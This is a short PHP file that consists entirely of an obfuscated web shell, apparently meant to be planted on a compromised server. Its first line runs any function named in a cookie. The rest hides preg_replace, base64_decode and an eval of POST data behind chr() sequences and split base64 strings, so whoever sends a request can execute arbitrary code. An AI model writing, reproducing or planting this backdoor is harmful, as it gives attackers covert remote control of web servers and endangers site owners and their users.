<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 $a = chr(112)./*1*/chr(114).chr(101)./*1*/chr(103).chr(95).chr(114).chr(101).chr(112).chr(108).chr(97).chr(99).chr(101); $c = chr(98).chr(97).chr(115)./*1*/chr(101).chr(54).chr(52)/*1*/.chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$b = "ZX"."Zh"."bCh"."iYXN"."lNjRfZ"."GVj"."b2RlK"."CRfU"."E9TVF"."snei"."ddKSk7";$a(chr(47).chr(52).chr(51).chr(56).chr(47).chr(101),$c($b),chr(52).chr(51).chr(56));